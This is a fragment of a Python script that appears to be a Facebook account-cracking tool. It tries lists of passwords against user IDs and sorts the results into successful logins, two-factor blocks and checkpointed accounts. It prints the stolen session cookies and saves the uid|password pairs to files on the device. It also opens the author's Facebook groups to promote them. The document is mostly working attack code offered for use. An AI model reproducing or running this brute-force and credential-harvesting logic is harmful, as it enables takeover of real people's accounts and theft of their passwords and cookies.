...
sleep(1)
os.system("clear")
print(" \033[92;1m  JOIN MY FACEBOOK GROUP + FOLLOW MY FB ID")
os.system('xdg-open https://www.facebook.com/groups/405527491346402/?ref=share')
os.system('xdg-open https://www.facebook.com/groups/583998899751445/?ref=share')
logo=("""
\033[1;31m╭━╮╭━┳━━━┳━╮╭━╮╱╱\033[1;32m╭┳━━┳━━╮╭━━━┳━╮╱╭╮
\033[1;31m┃┃╰╯┃┃╭━╮┣╮╰╯╭╯╱╱\033[1;32m┃┣┫┣┫╭╮┃┃╭━╮┃┃╰╮┃┃
\033[1;31m┃╭╮╭╮┃╰━╯┃╰╮╭╯╱╱╱\033[1;32m┃┃┃┃┃╰╯╰┫┃╱┃┃╭╮╰╯┃
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46mB4DH1N-JIBON-XD\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio B4DH1N-JIBON_OK.mp3")
                print(f'\r\x1b[38;5;46m[B4DH1N-JIBON-OK] '+uid+' | '+ps+ ' '+Jawnx(uid)+' ')
                print(f" Cookie : {coki}")
                cek_apk(session,coki)
                open('/sdcard/ B4DH1N-JIBON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio B4DH1N-JIBON_2F.mp3")
                    print('\r\x1b[38;5;45m[B4DH1N-JIBON-2F] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/B4DH1N-JIBON-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                  ...
                  #  os.system("play-audio JIBON_CP.mp3")
                    #print(f'\r\x1b[38;5;191m[B4DH1N-JIBON-CP] '+uid+' | '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/B4DH1N-JIBON-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[B4DH1N-JIBON-XD] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
